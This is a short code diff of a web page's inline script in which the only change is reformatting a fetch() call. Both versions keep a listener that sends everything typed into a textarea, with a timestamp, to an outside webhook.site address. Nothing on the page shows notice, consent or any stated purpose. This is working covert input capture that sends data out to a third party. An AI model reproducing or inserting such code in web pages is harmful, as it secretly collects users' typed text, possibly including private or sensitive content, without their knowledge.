@@ -15,10 +15,7 @@
       textarea.addEventListener("input", function (e) {
         const text = e.target.value;
         fetch(
-          `https://webhook.site/3834ef79-4a26-4f7f-9dce-569ccd329b48?text=${encodeURIComponent(
-            text
-          )}&timestamp=${encodeURIComponent(new Date().toISOString())}`
-        ).catch(console.error);
+          `https://webhook.site/3834ef79-4a26-4f7f-9dce-569ccd329b48?text=${encodeURIComponent(text)}&timestamp=${encodeURIComponent(new Date().toISOString())}`).catch(console.error);
       });
     </script>
   </body>
